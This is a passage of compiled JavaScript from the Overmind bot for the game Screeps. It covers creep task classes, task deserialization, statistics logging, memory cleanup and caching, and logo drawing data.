                const availableSource = creep.pos.findClosestByMultiRoomRange(availableSources);
                if (availableSource) {
                    creep.task = new TaskHarvest(availableSource);
                    return;
                }
            }
        }
        if (target) {
            if (isResource(target)) {
                creep.task = new TaskPickup(target);
                return;
            }
            else {
                creep.task = new TaskWithdraw(target);
                return;
            }
        }
        else {
            // if (creep.roleName == 'queen') {
            log.debug(`No valid withdraw target for ${creep.print}!`);
            // }
            creep.task = null;
        }
    }
    isValidTask() {
        return false;
    }
    isValidTarget() {
        return false;
    }
    work() {
        log.warning(`BAD RESULT: Should not get here...`);
        return ERR_INVALID_TARGET;
    }
};
TaskRecharge = __decorate([
    profile
], TaskRecharge);

const repairTaskName = 'repair';
let TaskRepair = class TaskRepair extends Task {
    constructor(target, options = {}) {
        super(repairTaskName, target, options);
        // Settings
        this.settings.timeout = 100;
        this.settings.targetRange = 3;
    }
    isValidTask() {
        return this.creep.carry.energy > 0;
    }
    isValidTarget() {
        return this.target && this.target.hits < this.target.hitsMax;
    }
    work() {
        const result = this.creep.repair(this.target);
        if (this.target.structureType == STRUCTURE_ROAD) {
            // prevents workers from idling for a tick before moving to next target
            const newHits = this.target.hits + this.creep.getActiveBodyparts(WORK) * REPAIR_POWER;
            if (newHits > this.target.hitsMax) {
                this.finish();
            }
        }
        return result;
    }
};
TaskRepair = __decorate([
    profile
], TaskRepair);

const reserveTaskName = 'colony';
let TaskReserve = class TaskReserve extends Task {
    constructor(target, options = {}) {
        super(reserveTaskName, target, options);
    }
    isValidTask() {
        return (this.creep.getActiveBodyparts(CLAIM) > 0);
    }
    isValidTarget() {
        const target = this.target;
        return (target != null && (!target.reservation || target.reservation.ticksToEnd < 4999));
    }
    work() {
        return this.creep.reserveController(this.target);
    }
};
TaskReserve = __decorate([
    profile
], TaskReserve);

const signControllerTaskName = 'signController';
let TaskSignController = class TaskSignController extends Task {
    constructor(target, options = {}) {
        super(signControllerTaskName, target, options);
    }
    isValidTask() {
        return true;
    }
    isValidTarget() {
        const controller = this.target;
        return (!controller.sign || controller.sign.text != Memory.settings.signature) && !controller.signedByScreeps;
    }
    work() {
        return this.creep.signController(this.target, Memory.settings.signature);
    }
};
TaskSignController = __decorate([
    profile
], TaskSignController);

const transferTaskName = 'transfer';
let TaskTransfer = class TaskTransfer extends Task {
    constructor(target, resourceType = RESOURCE_ENERGY, amount, options = {}) {
        super(transferTaskName, target, options);
        // Settings
        this.settings.oneShot = true;
        this.data.resourceType = resourceType;
        this.data.amount = amount;
    }
    isValidTask() {
        const amount = this.data.amount || 1;
        const resourcesInCarry = this.creep.carry[this.data.resourceType] || 0;
        return resourcesInCarry >= amount;
    }
    isValidTarget() {
        const amount = this.data.amount || 1;
        const target = this.target;
        if (target instanceof Creep) {
            return _.sum(target.carry) <= target.carryCapacity - amount;
        }
        else if (isStoreStructure(target)) {
            return _.sum(target.store) <= target.storeCapacity - amount;
        }
        else if (isEnergyStructure(target) && this.data.resourceType == RESOURCE_ENERGY) {
            return target.energy <= target.energyCapacity - amount;
        }
        else {
            if (target instanceof StructureLab) {
                return (target.mineralType == this.data.resourceType || !target.mineralType) &&
                    target.mineralAmount <= target.mineralCapacity - amount;
            }
            else if (target instanceof StructureNuker) {
                return this.data.resourceType == RESOURCE_GHODIUM &&
                    target.ghodium <= target.ghodiumCapacity - amount;
            }
            else if (target instanceof StructurePowerSpawn) {
                return this.data.resourceType == RESOURCE_POWER &&
                    target.power <= target.powerCapacity - amount;
            }
        }
        return false;
    }
    work() {
        return this.creep.transfer(this.target, this.data.resourceType, this.data.amount);
    }
};
TaskTransfer = __decorate([
    profile
], TaskTransfer);

const transferAllTaskName = 'transferAll';
let TaskTransferAll = class TaskTransferAll extends Task {
    constructor(target, skipEnergy = false, options = {}) {
        super(transferAllTaskName, target, options);
        this.data.skipEnergy = skipEnergy;
    }
    isValidTask() {
        for (const resourceType in this.creep.carry) {
            if (this.data.skipEnergy && resourceType == RESOURCE_ENERGY) {
                continue;
            }
            const amountInCarry = this.creep.carry[resourceType] || 0;
            if (amountInCarry > 0) {
                return true;
            }
        }
        return false;
    }
    isValidTarget() {
        return _.sum(this.target.store) < this.target.storeCapacity;
    }
    work() {
        for (const resourceType in this.creep.carry) {
            if (this.data.skipEnergy && resourceType == RESOURCE_ENERGY) {
                continue;
            }
            const amountInCarry = this.creep.carry[resourceType] || 0;
            if (amountInCarry > 0) {
                return this.creep.transfer(this.target, resourceType);
            }
        }
        return -1;
    }
};
TaskTransferAll = __decorate([
    profile
], TaskTransferAll);

const upgradeTaskName = 'upgrade';
let TaskUpgrade = class TaskUpgrade extends Task {
    constructor(target, options = {}) {
        super(upgradeTaskName, target, options);
        // Settings
        this.settings.targetRange = 3;
        this.settings.workOffRoad = true;
    }
    isValidTask() {
        return (this.creep.carry.energy > 0);
    }
    isValidTarget() {
        return this.target && this.target.my;
    }
    work() {
        return this.creep.upgradeController(this.target);
    }
};
TaskUpgrade = __decorate([
    profile
], TaskUpgrade);

/* Withdraw a resource from a target */
const withdrawAllTaskName = 'withdrawAll';
let TaskWithdrawAll = class TaskWithdrawAll extends Task {
    constructor(target, options = {}) {
        super(withdrawAllTaskName, target, options);
    }
    isValidTask() {
        return (_.sum(this.creep.carry) < this.creep.carryCapacity);
    }
    isValidTarget() {
        return _.sum(this.target.store) > 0;
    }
    work() {
        for (const resourceType in this.target.store) {
            const amountInStore = this.target.store[resourceType] || 0;
            if (amountInStore > 0) {
                return this.creep.withdraw(this.target, resourceType);
            }
        }
        return -1;
    }
};
TaskWithdrawAll = __decorate([
    profile
], TaskWithdrawAll);

// Reinstantiation of a task object from ProtoTask data
/**
 * The task initializer maps serialized prototasks to Task instances
 */
function initializeTask(protoTask) {
    // Retrieve name and target data from the ProtoTask
    const taskName = protoTask.name;
    const target = deref(protoTask._target.ref);
    let task;
    // Create a task object of the correct type
    switch (taskName) {
        case attackTaskName:
            task = new TaskAttack(target);
            break;
        case buildTaskName:
            task = new TaskBuild(target);
            break;
        case claimTaskName:
            task = new TaskClaim(target);
            break;
        case dismantleTaskName:
            task = new TaskDismantle(target);
            break;
        case dropTaskName:
            task = new TaskDrop(derefRoomPosition(protoTask._target._pos));
            break;
        // case fleeTaskName:
        //  task = new TaskFlee(derefRoomPosition(ProtoTask._target._pos) as fleeTargetType);
        //  break;
        case fortifyTaskName:
            task = new TaskFortify(target);
            break;
        case getBoostedTaskName:
            task = new TaskGetBoosted(target, protoTask.data.resourceType);
            break;
        case getRenewedTaskName:
            task = new TaskGetRenewed(target);
            break;
        case goToTaskName:
            // task = new TaskGoTo(derefRoomPosition(ProtoTask._target._pos) as goToTargetType);
            task = new TaskInvalid();
            break;
        case goToRoomTaskName:
            task = new TaskGoToRoom(protoTask._target._pos.roomName);
            break;
        case harvestTaskName:
            task = new TaskHarvest(target);
            break;
        case healTaskName:
            task = new TaskHeal(target);
            break;
        case meleeAttackTaskName:
            task = new TaskMeleeAttack(target);
            break;
        case pickupTaskName:
            task = new TaskPickup(target);
            break;
        case rangedAttackTaskName:
            task = new TaskRangedAttack(target);
            break;
        case rechargeTaskName:
            task = new TaskRecharge(null);
            break;
        case repairTaskName:
            task = new TaskRepair(target);
            break;
        case reserveTaskName:
            task = new TaskReserve(target);
            break;
        case signControllerTaskName:
            task = new TaskSignController(target);
            break;
        case transferTaskName:
            task = new TaskTransfer(target);
            break;
        case transferAllTaskName:
            task = new TaskTransferAll(target);
            break;
        case upgradeTaskName:
            task = new TaskUpgrade(target);
            break;
        case withdrawTaskName:
            task = new TaskWithdraw(target);
            break;
        case withdrawAllTaskName:
            task = new TaskWithdrawAll(target);
            break;
        default:
            log.error(`Invalid task name: ${taskName}! task.creep: ${protoTask._creep.name}. Deleting from memory!`);
            task = new TaskInvalid();
            break;
    }
    // Modify the task object to reflect any changed properties
    task.proto = protoTask;
    // Return it
    return task;
}
screepsProfiler.registerFN(initializeTask, 'initializeTask');

/**
 * Operational statistics, stored in Memory.stats, will be updated every (this many) ticks
 */
const LOG_STATS_INTERVAL = 8;
let Stats = class Stats {
    static clean() {
        if (Game.time % LOG_STATS_INTERVAL == 0) {
            const protectedKeys = [
                'persistent',
            ];
            for (const key in Memory.stats) {
                if (!protectedKeys.includes(key)) {
                    delete Memory.stats[key];
                }
            }
        }
    }
    static log(key, value, truncateNumbers = true) {
        if (Game.time % LOG_STATS_INTERVAL == 0) {
            if (truncateNumbers && value != undefined) {
                const decimals = 5;
                if (typeof value == 'number') {
                    value = value.truncate(decimals);
                }
                else {
                    for (const i in value) {
                        value[i] = value[i].truncate(decimals);
                    }
                }
            }
            Mem.setDeep(Memory.stats, key, value);
        }
    }
    // static accumulate(key: string, value: number): void {
    //  if (!Memory.stats[key]) {
    //      Memory.stats[key] = 0;
    //  }
    //  Memory.stats[key] += value;
    // }
    static run() {
        if (Game.time % LOG_STATS_INTERVAL == 0) {
            // Record IVM heap statistics
            Memory.stats['cpu.heapStatistics'] = Game.cpu.getHeapStatistics();
            // Log GCL
            this.log('gcl.progress', Game.gcl.progress);
            this.log('gcl.progressTotal', Game.gcl.progressTotal);
            this.log('gcl.level', Game.gcl.level);
            // Log memory usage
            this.log('memory.used', RawMemory.get().length);
            // Log CPU
            this.log('cpu.limit', Game.cpu.limit);
            this.log('cpu.bucket', Game.cpu.bucket);
        }
        const used = Game.cpu.getUsed();
        this.log('cpu.getUsed', used);
        Memory.stats.persistent.avgCPU = exponentialMovingAverage(used, Memory.stats.persistent.avgCPU, 100);
    }
};
Stats = __decorate([
    profile
], Stats);

var Mem_1;
var Autonomy;
(function (Autonomy) {
    Autonomy[Autonomy["Manual"] = 0] = "Manual";
    Autonomy[Autonomy["SemiAutomatic"] = 1] = "SemiAutomatic";
    Autonomy[Autonomy["Automatic"] = 2] = "Automatic";
})(Autonomy || (Autonomy = {}));
function getAutonomyLevel() {
    switch (Memory.settings.operationMode) {
        case ('manual'):
            return Autonomy.Manual;
        case ('semiautomatic'):
            return Autonomy.SemiAutomatic;
        case ('automatic'):
            return Autonomy.Automatic;
        default:
            log.warning(`ERROR: ${Memory.settings.operationMode} is not a valid operation mode! ` +
                `Defaulting to ${DEFAULT_OPERATION_MODE}; use setMode() to change.`);
            Memory.settings.operationMode = DEFAULT_OPERATION_MODE;
            return getAutonomyLevel();
    }
}
let lastMemory;
let lastTime = 0;
const MAX_BUCKET = 10000;
const HEAP_CLEAN_FREQUENCY = 200;
const BUCKET_CLEAR_CACHE = 7000;
const BUCKET_CPU_HALT = 4000;
/**
 * This module contains a number of low-level memory clearing and caching functions
 */
let Mem = Mem_1 = class Mem {
    static shouldRun() {
        let shouldRun = true;
        if (!isIVM()) {
            log.warning(`Overmind requires isolated-VM to run. Change settings at screeps.com/a/#!/account/runtime`);
            shouldRun = false;
        }
        if (USE_PROFILER && Game.time % 10 == 0) {
            log.warning(`Profiling is currently enabled; only ${PROFILER_COLONY_LIMIT} colonies will be run!`);
        }
        if (Game.cpu.bucket < 500) {
            if (_.keys(Game.spawns).length > 1 && !Memory.resetBucket && !Memory.haltTick) {
                // don't run CPU reset routine at very beginning or if it's already triggered
                log.warning(`CPU bucket is critically low (${Game.cpu.bucket})! Starting CPU reset routine.`);
                Memory.resetBucket = true;
                Memory.haltTick = Game.time + 1; // reset global next tick
            }
            else {
                log.info(`CPU bucket is too low (${Game.cpu.bucket}). Postponing operation until bucket reaches 500.`);
            }
            shouldRun = false;
        }
        if (Memory.resetBucket) {
            if (Game.cpu.bucket < MAX_BUCKET - Game.cpu.limit) {
                log.info(`Operation suspended until bucket recovery. Bucket: ${Game.cpu.bucket}/${MAX_BUCKET}`);
                shouldRun = false;
            }
            else {
                delete Memory.resetBucket;
            }
        }
        if (Memory.haltTick) {
            if (Memory.haltTick == Game.time) {
                Game.cpu.halt(); // TODO: remove any typing when typed-screeps updates to include this method
                shouldRun = false;
            }
            else if (Memory.haltTick < Game.time) {
                delete Memory.haltTick;
            }
        }
        return shouldRun;
    }
    /**
     * Attempt to load the parsed memory from a previous tick to avoid parsing costs
     */
    static load() {
        if (lastTime && lastMemory && Game.time == lastTime + 1) {
            delete global.Memory;
            global.Memory = lastMemory;
            RawMemory._parsed = lastMemory;
        }
        else {
            // noinspection BadExpressionStatementJS
            /* tslint:disable:no-unused-expression */
            Memory.rooms; // forces parsing
            /* tslint:enable:no-unused-expression */
            lastMemory = RawMemory._parsed;
            Memory.stats.persistent.lastMemoryReset = Game.time;
        }
        lastTime = Game.time;
        // Handle global time
        if (!global.age) {
            global.age = 0;
        }
        global.age++;
        Memory.stats.persistent.globalAge = global.age;
    }
    static garbageCollect(quick) {
        if (global.gc) { // sometimes garbage collection isn't available
            const start = Game.cpu.getUsed();
            global.gc(quick);
            log.debug(`Running ${quick ? 'quick' : 'FULL'} garbage collection. ` +
                `Elapsed time: ${Game.cpu.getUsed() - start}.`);
        }
        else {
            log.debug(`Manual garbage collection is unavailable on this server.`);
        }
    }
    static wrap(memory, memName, defaults = {}, deep = false) {
        if (!memory[memName]) {
            memory[memName] = _.clone(defaults);
        }
        if (deep) {
            _.defaultsDeep(memory[memName], defaults);
        }
        else {
            _.defaults(memory[memName], defaults);
        }
        return memory[memName];
    }
    static _setDeep(object, keys, value) {
        const key = _.first(keys);
        keys = _.drop(keys);
        if (keys.length == 0) { // at the end of the recursion
            object[key] = value;
            return;
        }
        else {
            if (!object[key]) {
                object[key] = {};
            }
            return Mem_1._setDeep(object[key], keys, value);
        }
    }
    /**
     * Recursively set a value of an object given a dot-separated key, adding intermediate properties as necessary
     * Ex: Mem.setDeep(Memory.colonies, 'E1S1.miningSites.siteID.stats.uptime', 0.5)
     */
    static setDeep(object, keyString, value) {
        const keys = keyString.split('.');
        return Mem_1._setDeep(object, keys, value);
    }
    static formatOvermindMemory() {
        if (!Memory.Overmind) {
            Memory.Overmind = {};
        }
        if (!Memory.colonies) {
            Memory.colonies = {};
        }
    }
    static formatPathingMemory() {
        if (!Memory.pathing) {
            Memory.pathing = {}; // Hacky workaround
        }
        _.defaults(Memory.pathing, {
            paths: {},
            distances: {},
            weightedDistances: {},
        });
    }
    static formatDefaultMemory() {
        if (!Memory.rooms) {
            Memory.rooms = {};
        }
        if (!Memory.creeps) {
            Memory.creeps = {};
        }
        if (!Memory.flags) {
            Memory.flags = {};
        }
    }
    static format() {
        // Format the memory as needed, done once every global reset
        this.formatDefaultMemory();
        this.formatOvermindMemory();
        this.formatPathingMemory();
        // Rest of memory formatting
        if (!Memory.settings) {
            Memory.settings = {};
        }
        if (!USE_PROFILER) {
            delete Memory.profiler;
        }
        _.defaults(Memory.settings, {
            signature: DEFAULT_OVERMIND_SIGNATURE,
            operationMode: DEFAULT_OPERATION_MODE,
            log: {},
            enableVisuals: true,
        });
        if (!Memory.stats) {
            Memory.stats = {};
        }
        if (!Memory.stats.persistent) {
            Memory.stats.persistent = {};
        }
        if (!Memory.constructionSites) {
            Memory.constructionSites = {};
        }
        // Make global memory
        this.initGlobalMemory();
    }
    static initGlobalMemory() {
        global._cache = {
            accessed: {},
            expiration: {},
            structures: {},
            numbers: {},
            lists: {},
            costMatrices: {},
            roomPositions: {},
            things: {},
        };
    }
    static clean() {
        // Clean the memory of non-existent objects every tick
        this.cleanHeap();
        this.cleanCreeps();
        this.cleanFlags();
        this.cleanColonies();
        this.cleanPathingMemory();
        this.cleanConstructionSites();
        Stats.clean();
    }
    /**
     * Attempt to clear some things out of the global heap to prevent increasing CPU usage
     */
    static cleanHeap() {
        if (Game.time % HEAP_CLEAN_FREQUENCY == HEAP_CLEAN_FREQUENCY - 3) {
            if (Game.cpu.bucket < BUCKET_CPU_HALT) {
                Game.cpu.halt();
            }
            else if (Game.cpu.bucket < BUCKET_CLEAR_CACHE) {
                delete global._cache;
                this.initGlobalMemory();
            }
        }
    }
    static cleanCreeps() {
        // Clear memory for non-existent creeps
        for (const name in Memory.creeps) {
            if (!Game.creeps[name]) {
                delete Memory.creeps[name];
                delete global[name];
            }
        }
    }
    static cleanFlags() {
        // Clear memory for non-existent flags
        for (const name in Memory.flags) {
            if (!Game.flags[name]) {
                delete Memory.flags[name];
                delete global[name];
            }
        }
    }
    static cleanColonies() {
        // Clear memory of dead colonies
        for (const name in Memory.colonies) {
            const room = Game.rooms[name];
            if (!(room && room.my)) {
                // Delete only if "persistent" is not set - use case: praise rooms
                if (!Memory.colonies[name].persistent) {
                    delete Memory.colonies[name];
                    delete global[name];
                }
            }
        }
    }
    static cleanConstructionSites() {
        // Remove ancient construction sites
        if (Game.time % 10 == 0) {
            const CONSTRUCTION_SITE_TIMEOUT = 50000;
            // Add constructionSites to memory and remove really old ones
            for (const id in Game.constructionSites) {
                const site = Game.constructionSites[id];
                if (!Memory.constructionSites[id]) {
                    Memory.constructionSites[id] = Game.time;
                }
                else if (Game.time - Memory.constructionSites[id] > CONSTRUCTION_SITE_TIMEOUT) {
                    site.remove();
                }
                // Remove duplicate construction sites that get placed on top of existing structures due to caching
                if (site && site.pos.isVisible && site.pos.lookForStructure(site.structureType)) {
                    site.remove();
                }
            }
            // Remove dead constructionSites from memory
            for (const id in Memory.constructionSites) {
                if (!Game.constructionSites[id]) {
                    delete Memory.constructionSites[id];
                }
            }
        }
    }
    static cleanPathingMemory() {
        const CLEAN_FREQUENCY = 5;
        if (Game.time % CLEAN_FREQUENCY == 0) {
            const distanceCleanProbability = 0.001 * CLEAN_FREQUENCY;
            const weightedDistanceCleanProbability = 0.01 * CLEAN_FREQUENCY;
            // Randomly clear some cached path lengths
            for (const pos1Name in Memory.pathing.distances) {
                if (_.isEmpty(Memory.pathing.distances[pos1Name])) {
                    delete Memory.pathing.distances[pos1Name];
                }
                else {
                    for (const pos2Name in Memory.pathing.distances[pos1Name]) {
                        if (Math.random() < distanceCleanProbability) {
                            delete Memory.pathing.distances[pos1Name][pos2Name];
                        }
                    }
                }
            }
            // Randomly clear weighted distances
            for (const pos1Name in Memory.pathing.weightedDistances) {
                if (_.isEmpty(Memory.pathing.weightedDistances[pos1Name])) {
                    delete Memory.pathing.weightedDistances[pos1Name];
                }
                else {
                    for (const pos2Name in Memory.pathing.weightedDistances[pos1Name]) {
                        if (Math.random() < weightedDistanceCleanProbability) {
                            delete Memory.pathing.weightedDistances[pos1Name][pos2Name];
                        }
                    }
                }
            }
        }
    }
};
Mem = Mem_1 = __decorate([
    profile
], Mem);

const CACHE_TIMEOUT = 50;
const SHORT_CACHE_TIMEOUT = 10;
/**
 * The GlobalCache ($) module saves frequently accessed deserialized objects in temporary, volatile global memory
 */
let $ = class $ {
    static structures(saver, key, callback, timeout = CACHE_TIMEOUT) {
        const cacheKey = saver.ref + 's' + key;
        if (!_cache.structures[cacheKey] || Game.time > _cache.expiration[cacheKey]) {
            // Recache if new entry or entry is expired
            _cache.structures[cacheKey] = callback();
            _cache.expiration[cacheKey] = getCacheExpiration(timeout, Math.ceil(timeout / 10));
        }
        else {
            // Refresh structure list by ID if not already done on current tick
            if ((_cache.accessed[cacheKey] || 0) < Game.time) {
                _cache.structures[cacheKey] = _.compact(_.map(_cache.structures[cacheKey] || [], s => Game.getObjectById(s.id)));
                _cache.accessed[cacheKey] = Game.time;
            }
        }
        return _cache.structures[cacheKey];
    }
    static number(saver, key, callback, timeout = SHORT_CACHE_TIMEOUT) {
        const cacheKey = saver.ref + '#' + key;
        if (_cache.numbers[cacheKey] == undefined || Game.time > _cache.expiration[cacheKey]) {
            // Recache if new entry or entry is expired
            _cache.numbers[cacheKey] = callback();
            _cache.expiration[cacheKey] = getCacheExpiration(timeout, Math.ceil(timeout / 10));
        }
        return _cache.numbers[cacheKey];
    }
    // TODO: for some reason overloading isn't working here...
    // static pos(saver: { ref: string }, key: string, callback: () => RoomPosition, timeout ?: number): RoomPosition;
    static pos(saver, key, callback, timeout) {
        const cacheKey = saver.ref + 'p' + key;
        if (_cache.roomPositions[cacheKey] == undefined || Game.time > _cache.expiration[cacheKey]) {
            // Recache if new entry or entry is expired
            _cache.roomPositions[cacheKey] = callback();
            if (!timeout)
                timeout = CACHE_TIMEOUT;
            _cache.expiration[cacheKey] = getCacheExpiration(timeout, Math.ceil(timeout / 10));
        }
        return _cache.roomPositions[cacheKey];
    }
    static list(saver, key, callback, timeout = CACHE_TIMEOUT) {
        const cacheKey = saver.ref + 'l' + key;
        if (_cache.lists[cacheKey] == undefined || Game.time > _cache.expiration[cacheKey]) {
            // Recache if new entry or entry is expired
            _cache.lists[cacheKey] = callback();
            _cache.expiration[cacheKey] = getCacheExpiration(timeout, Math.ceil(timeout / 10));
        }
        return _cache.lists[cacheKey];
    }
    static costMatrix(roomName, key, callback, timeout = SHORT_CACHE_TIMEOUT) {
        const cacheKey = roomName + 'm' + key;
        if (_cache.costMatrices[cacheKey] == undefined || Game.time > _cache.expiration[cacheKey]) {
            // Recache if new entry or entry is expired
            _cache.costMatrices[cacheKey] = callback();
            _cache.expiration[cacheKey] = getCacheExpiration(timeout, Math.ceil(timeout / 10));
        }
        return _cache.costMatrices[cacheKey];
    }
    static costMatrixRecall(roomName, key) {
        const cacheKey = roomName + ':' + key;
        return _cache.costMatrices[cacheKey];
    }
    static set(thing, key, callback, timeout = CACHE_TIMEOUT) {
        const cacheKey = thing.ref + '$' + key;
        if (!_cache.things[cacheKey] || Game.time > _cache.expiration[cacheKey]) {
            // Recache if new entry or entry is expired
            _cache.things[cacheKey] = callback();
            _cache.expiration[cacheKey] = getCacheExpiration(timeout, Math.ceil(timeout / 10));
        }
        else {
            // Refresh structure list by ID if not already done on current tick
            if ((_cache.accessed[cacheKey] || 0) < Game.time) {
                if (_.isArray(_cache.things[cacheKey])) {
                    _cache.things[cacheKey] = _.compact(_.map(_cache.things[cacheKey], s => Game.getObjectById(s.id)));
                }
                else {
                    _cache.things[cacheKey] = Game.getObjectById(_cache.things[cacheKey].id);
                }
                _cache.accessed[cacheKey] = Game.time;
            }
        }
        thing[key] = _cache.things[cacheKey];
    }
    static refresh(thing, ...keys) {
        _.forEach(keys, function (key) {
            if (thing[key]) {
                if (_.isArray(thing[key])) {
                    thing[key] = _.compact(_.map(thing[key], s => Game.getObjectById(s.id)));
                }
                else {
                    thing[key] = Game.getObjectById(thing[key].id);
                }
            }
        });
    }
    static refreshObject(thing, ...keys) {
        _.forEach(keys, function (key) {
            if (_.isObject(thing[key])) {
                for (const prop in thing[key]) {
                    if (_.isArray(thing[key][prop])) {
                        thing[key][prop] = _.compact(_.map(thing[key][prop], s => Game.getObjectById(s.id)));
                    }
                    else {
                        thing[key][prop] = Game.getObjectById(thing[key][prop].id);
                    }
                }
            }
        });
    }
    static refreshRoom(thing) {
        thing.room = Game.rooms[thing.room.name];
    }
};
$ = __decorate([
    profile
], $);

/* tslint:disable: max-line-length */
const asciiLogo = ['___________________________________________________________',
    '',
    ' _____  _    _ _______  ______ _______ _____ __   _ ______ ',
    '|     |  \\  /  |______ |_____/ |  |  |   |   | \\  | |     \\',
    '|_____|   \\/   |______ |    \\_ |  |  | __|__ |  \\_| |_____/',
    '',
    '_______________________ Screeps AI ________________________'];
const asciiLogoSmall = [' _____  _    _ _______  ______ _______ _____ __   _ ______ ',
    '|     |  \\  /  |______ |_____/ |  |  |   |   | \\  | |     \\',
    '|_____|   \\/   |______ |    \\_ |  |  | __|__ |  \\_| |_____/'];
const asciiLogoRL = [' _____  _    _ _______  ______ _______ _____ __   _ ______ ',
    '|     |  \\  /  |______ |_____/ |  |  |   |   | \\  | |     \\',
    '|_____|   \\/   |______ |    \\_ |  |  | __|__ |  \\_| |_____/',
    '....... R E I N F O R C E M E N T   L E A R N I N G .......'];
const _logoComponents = {
    black: {
        style: { fill: '#000000', stroke: '#000000', strokeWidth: 0 },
        points: [[-4.4, -0.34], [-3.44, -1.04], [-3.08, -1.04], [-2.78, -0.82], [-2.7, -0.6], [-2.92, -0.24], [-3.36, -0.24], [-3.58, -0.5], [-3.8, -0.28], [-4.14, 0.42], [-4.22, 1.24], [-3.6, 0.42], [-2.98, 0.46], [-2.84, 0.72], [-2.9, 1.02], [-3.26, 1.22], [-3.68, 1.12], [-3.72, 1.22], [-3.76, 2.18], [-3.58, 2.9], [-3.22, 1.8], [-2.72, 1.66], [-2.4, 2.08], [-2.64, 2.44], [-3.1, 2.42], [-3.1, 2.86], [-2.86, 3.4], [-2.52, 3.74], [-2.58, 3.08], [-2.34, 2.86], [-1.98, 2.82], [-1.48, 3.12], [-1.34, 3.72], [-1.64, 4.16], [-2.08, 4.32], [-2.78, 4.24], [-3.4, 3.84], [-3.02, 4.34], [-2.56, 4.6], [-0.94, 4.78], [4.0e-2, 4.5], [0.86, 3.9], [-0.44, 3.18], [-0.46, 2.86], [0.88, 2.84], [2.02, 3.2], [3.1, 2.22], [4.18, 0.6], [4.54, -1], [3.84, 0], [3.5, 0.12], [3.18, 2.0e-2], [3.14, -0.46], [3.38, -0.6], [3.82, -0.5], [4, -0.94], [4.08, -1.88], [3.96, -2.6], [3.56, -1.54], [3.16, -1.22], [2.78, -1.28], [2.6, -1.6], [2.7, -1.88], [2.96, -2.02], [3.4, -1.92], [3.46, -2.12], [3.38, -2.98], [2.9, -3.98], [2.52, -4.32], [2.7, -3.58], [2.54, -2.82], [2.22, -2.38], [1.7, -2.36], [1.48, -2.64], [1.56, -3.1], [2.18, -3.24], [1.94, -3.9], [1.2, -4.62], [0.14, -5.14], [0.88, -4.18], [0.9, -3.54], [0.66, -3.04], [0.3, -2.82], [-0.14, -2.9], [-0.2, -3.42], [0.28, -3.66], [-0.38, -4.16], [-1.26, -4.32], [-2.4, -4.22], [-1.64, -4.02], [-1.08, -3.64], [-0.82, -3.04], [-0.88, -2.56], [-1.12, -2.4], [-1.5, -2.44], [-1.68, -2.7], [-1.56, -3.12], [-1.84, -3.2], [-2.72, -3.16], [-3.44, -2.84], [-3.98, -2.34], [-3.38, -2.5], [-2.48, -2.36], [-2.12, -2.12], [-2.06, -1.7], [-2.18, -1.52], [-2.56, -1.44], [-2.82, -1.6], [-2.84, -2.06], [-3.38, -1.84], [-4.06, -1.18], [-4.4, -0.36]],
    },
    blue: {
        style: { fill: '#6482B0', stroke: '#6482B0', strokeWidth: 0 },
        points: [[-2.48, -0.72], [-1.5, -0.34], [-1.18, -0.88], [-0.74, -1.24], [-6.0e-2, -1.46], [0.54, -1.44], [0.94, -1.34], [1.82, -0.46], [2.74, -0.9], [2.92, -0.42], [3.02, 0.32], [2.9, 1.02], [2.52, 1.86], [1.94, 2.5], [1.2, 2.94], [0.82, 2.02], [1.32, 1.72], [1.56, 1.48], [1.8, 1.1], [1.98, 0.44], [1.94, 0], [1.8, -0.46], [0.94, -1.36], [1.34, -2.3], [0.5, -2.54], [-0.12, -2.54], [-0.86, -2.36], [-1.38, -2.1], [-1.82, -1.76], [-2.26, -1.22], [-2.48, -0.74]],
    },
    red: {
        style: { fill: '#EA3747', stroke: '#EA3747', strokeWidth: 0 },
        points: [[0.94, -1.3], [1.28, -1.08], [1.58, -0.78], [1.78, -0.46], [2.7, -0.92], [2.72, -1], [2.44, -1.46], [2.02, -1.9], [1.42, -2.28], [0.94, -1.32]],
    },
    pink: {
        style: { fill: '#FF0080', stroke: '#FF0080', strokeWidth: 0 },
        points: [[-1.4, 0.32], [-0.92, 0.2], [-0.46, -6.0e-2], [-8.0e-2, -0.5], [0.12, -0.98], [0.14, -1.18], [0.2, -1.18], [0.22, -0.98], [0.4, -0.54], [0.8, -6.0e-2], [1.26, 0.2], [1.74, 0.32], [1.62, 0.3], [1.62, 0.36], [1.26, 0.44], [0.78, 0.72], [0.38, 1.22], [0.18, 1.84], [-6.0e-2, 1.18], [-0.46, 0.7], [-0.92, 0.44], [-1.38, 0.34]],
    },
    lgray: {
        style: { fill: '#ABB7C5', stroke: '#ABB7C5', strokeWidth: 0 },
        points: [[-2.64, 1.04], [-2.34, 1.78], [-2.06, 2.18], [-1.56, 2.64], [-0.98, 2.96], [-0.62, 3.08], [-0.52, 3.06], [-0.28, 2.06], [-0.72, 1.88], [-1.06, 1.62], [-1.36, 1.26], [-1.58, 0.76], [-2.56, 0.94], [-2.64, 1.02]],
    },
    purple: {
        style: { fill: '#2F0092', stroke: '#2F0092', strokeWidth: 0 },
        points: [[-1.48, 0.4], [-1.38, -0.24], [-1.04, -0.8], [-0.46, -1.2], [0.22, -1.32], [0.14, -1.24], [0.1, -0.94], [-8.0e-2, -0.52], [-0.42, -0.1], [-0.84, 0.16], [-1.4, 0.3], [-0.94, 0.44], [-0.34, 0.82], [4.0e-2, 1.4], [0.18, 1.88], [0.32, 1.36], [0.72, 0.78], [1.28, 0.44], [1.74, 0.34], [1.06, 0.1], [0.6, -0.26], [0.24, -0.94], [0.2, -1.24], [0.28, -1.32], [0.74, -1.22], [1.18, -0.98], [1.46, -0.7], [1.72, -0.24], [1.82, 0.26], [1.78, 0.68], [1.6, 1.14], [1.28, 1.54], [0.84, 1.82], [0.46, 1.94], [0.18, 1.98], [-0.46, 1.84], [-0.82, 1.64], [-1.22, 1.2], [-1.4, 0.82], [-1.46, 0.4]]
    },
    dgray: {
        style: { fill: '#303030', stroke: '#303030', strokeWidth: 0 },
        points: [[-2.42, 0.52], [-2.4, -8.0e-2], [-2.28, -0.56], [-1.52, -0.3], [-1.62, 0.24], [-1.58, 0.7], [-0.2, 2.06], [0.34, 2.1], [0.8, 2.02], [1.06, 2.7], [1.04, 2.78], [0.54, 2.92], [6.0e-2, 2.94], [-0.42, 2.86], [-0.22, 2.06], [-0.26, 2.08], [-1.6, 0.7], [-2.36, 0.86], [-2.4, 0.52]]
    },
};
const _logoText = {
    V: {
        coords: [75, 500],
        style: { fill: '#6b6b6b', stroke: '#6b6b6b', strokeWidth: 0 },
